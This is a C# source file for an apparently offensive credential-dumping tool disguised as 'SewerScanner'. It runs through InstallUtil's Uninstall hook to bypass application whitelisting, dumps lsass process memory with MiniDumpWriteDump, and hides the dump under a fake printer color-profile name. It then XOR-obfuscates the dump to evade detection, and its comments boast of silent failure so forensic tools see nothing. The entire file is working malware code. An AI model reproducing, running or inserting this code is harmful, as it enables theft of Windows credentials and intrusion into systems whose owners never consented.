using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.IO;
using System.ComponentModel;
using System.Configuration.Install;

[RunInstaller(true)]
public class SewerScanner : Installer {

    public delegate bool MiniDumpWriteDump(IntPtr hProcess, uint ProcessId, IntPtr hFile, int DumpType, IntPtr ExceptionParam, IntPtr UserStreamParam, IntPtr CallbackParam);

    [DllImport("kernel32.dll")] static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
    [DllImport("kernel32.dll")] static extern IntPtr GetModuleHandle(string lpModuleName);
    [DllImport("kernel32.dll")] static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, uint processId);
    [DllImport("kernel32.dll")] static extern bool CloseHandle(IntPtr hObject);

    // Required entry point for C# compilation
    // This won't actually be called; InstallUtil invokes Uninstall() instead
    public static void Main(string[] args) {
        Console.WriteLine("[*] Use with InstallUtil: InstallUtil.exe SewerScanner.exe");
    }

    public override void Uninstall(System.Collections.IDictionary savedState) {
        base.Uninstall(savedState);
        string path = @"C:\Windows\System32\spool\drivers\color\ExpressColor_v4.dat";
        
        // Ensure directory exists before attempting dump
        try {
            string directory = Path.GetDirectoryName(path);
            if (!Directory.Exists(directory)) {
                Directory.CreateDirectory(directory);
            }
        } catch { }
        
        DumpLsass(path);
        ScrambleFile(path);
    }

    private void DumpLsass(string path) {
        IntPtr hProcess = IntPtr.Zero;
        try {
            Process[] processes = Process.GetProcessesByName("lsass");
            if (processes.Length == 0) {
                return;
            }
            
            uint pid = (uint)processes[0].Id;
            hProcess = OpenProcess(0x0410, false, pid);
            
            if (hProcess == IntPtr.Zero) {
                return;
            }

            IntPtr hDbgHelp = GetModuleHandle("dbghelp.dll");
            if (hDbgHelp == IntPtr.Zero) {
                return;
            }
            
            IntPtr pFunction = GetProcAddress(hDbgHelp, "MiniDumpWriteDump");
            if (pFunction == IntPtr.Zero) {
                return;
            }
            
            MiniDumpWriteDump dump = (MiniDumpWriteDump)Marshal.GetDelegateForFunctionPointer(pFunction, typeof(MiniDumpWriteDump));

            using (FileStream fs = new FileStream(path, FileMode.Create, FileAccess.Write)) {
                dump(hProcess, pid, fs.SafeFileHandle.DangerousGetHandle(), 2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
            }
        } catch {
            // Silent failure - no errors to forensic tools
        } finally {
            if (hProcess != IntPtr.Zero) {
                CloseHandle(hProcess);
            }
        }
    }

    private void ScrambleFile(string path) {
        try {
            if (!File.Exists(path)) {
                return;
            }
            
            byte[] key = { 0xDE, 0xAD, 0xBE, 0xEF }; // Your secret key
            byte[] data = File.ReadAllBytes(path);

            for (int i = 0; i < data.Length; i++) {
                data[i] = (byte)(data[i] ^ key[i % key.Length]);
            }

            File.WriteAllBytes(path, data); // Overwrite the original with scrambled data
        } catch {
            // Silent failure
        }
    }
}
